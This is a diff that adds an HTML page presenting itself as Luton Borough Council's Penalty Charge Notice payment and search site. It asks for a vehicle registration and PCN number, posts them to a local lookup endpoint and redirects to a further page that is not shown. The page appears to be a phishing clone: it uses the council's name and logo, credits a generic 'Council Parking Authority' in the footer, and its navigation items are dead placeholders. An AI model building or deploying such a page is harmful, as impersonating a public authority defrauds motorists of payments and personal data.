@@ -1,0 +1,109 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>PCN Search - LUTON BOROUGH COUNCIL</title>
+<link rel="stylesheet" href="style.css">
+<style>
+  .site-header { display: flex; align-items: center; gap: 16px; }
+  .site-header .logo { height: 64px; width: auto; display: block; flex-shrink: 0; }
+</style></head><body>
+<header class="site-header">
+  <img class="logo" src="logo.jpeg" alt="Luton Borough Council logo">
+  <div class="site-title">
+    <div class="name">LUTON BOROUGH COUNCIL</div>
+  </div>
+</header>
+<div class="band"></div>
+<main>
+  <h1><u>PCN</u> Details</h1>
+  <p class="lead">You can use this site to pay for a Penalty Charge Notice (PCN) and to view information about the contravention.</p>
+
+  <div class="notice">
+    <div class="icon"><span>i</span></div>
+    <div>Please enter the required information as printed on your Penalty Charge Notice.</div>
+  </div>
+  <div class="notice">
+    <div class="icon"><span>i</span></div>
+    <div>Fields marked with <span class="req">*</span> must be entered.</div>
+  </div>
+
+  <h2><u>PCN</u> details</h2>
+
+  <form id="pcnForm" autocomplete="off">
+    <div class="field-row">
+      <label for="vrn">Vehicle Registration Number <span class="req">*</span></label>
+      <input type="text" id="vrn" name="vrn" maxlength="12">
+    </div>
+    <div class="error-text" id="vrnError">Please enter a vehicle registration number.</div>
+    <div class="field-row">
+      <label for="pcn">Penalty Charge Notice (PCN) <span class="req">*</span></label>
+      <input type="text" id="pcn" name="pcn" maxlength="20">
+    </div>
+    <div class="error-text" id="pcnError">Please enter a PCN number.</div>
+    <div class="actions">
+      <button type="submit" class="search-btn">Search</button>
+    </div>
+  </form>
+  <div class="err" id="err" style="margin-top:16px;max-width:620px;text-align:right"></div>
+</main>
+
+<footer class="site-footer">
+  <div class="footer-cols">
+    <div>
+      <h4>Site details</h4>
+      <ul>
+        <li>Homepage</li>
+        <li>Contact us</li>
+        <li>Website help</li>
+        <li>Privacy and cookies</li>
+      </ul>
+    </div>
+    <div>
+      <h4>Quick links</h4>
+      <ul>
+        <li>Pay a PCN</li>
+        <li>Appeal a PCN</li>
+        <li>PCN Search</li>
+      </ul>
+    </div>
+    <div>
+      <h4>Connect</h4>
+      <ul>
+        <li>Stay connected</li>
+        <li>Provide feedback</li>
+      </ul>
+      <div class="footer-social">
+        <a href="#" class="twitter" aria-label="Twitter">𝕏</a>
+        <a href="#" class="facebook" aria-label="Facebook">f</a>
+      </div>
+    </div>
+  </div>
+  <div class="footer-bottom">
+    <span>© 2026 Council Parking Authority</span>
+  </div>
+</footer>
+
+<script>
+const form = document.getElementById('pcnForm');
+const vrnInput = document.getElementById('vrn');
+const pcnInput = document.getElementById('pcn');
+const vrnError = document.getElementById('vrnError');
+const pcnError = document.getElementById('pcnError');
+const err = document.getElementById('err');
+
+form.addEventListener('submit', async function(e) {
+  e.preventDefault();
+  let valid = true;
+  if (!vrnInput.value.trim()) { vrnError.classList.add('show'); valid = false; }
+  else vrnError.classList.remove('show');
+  if (!pcnInput.value.trim()) { pcnError.classList.add('show'); valid = false; }
+  else pcnError.classList.remove('show');
+  if (!valid) return;
+  err.textContent = '';
+  const vrn = vrnInput.value.trim().toUpperCase();
+  const pcn = pcnInput.value.trim().toUpperCase();
+  const r = await fetch('/api/lookup', {method:'POST',
+    headers:{'Content-Type':'application/json'}, body: JSON.stringify({vrn, pcn})});
+  if (!r.ok) { err.textContent = 'No matching record found. Please check your details.'; return; }
+  location.href = 'pcn.html?vrn=' + encodeURIComponent(vrn) + '&pcn=' + encodeURIComponent(pcn);
+});
+</script></body></html>
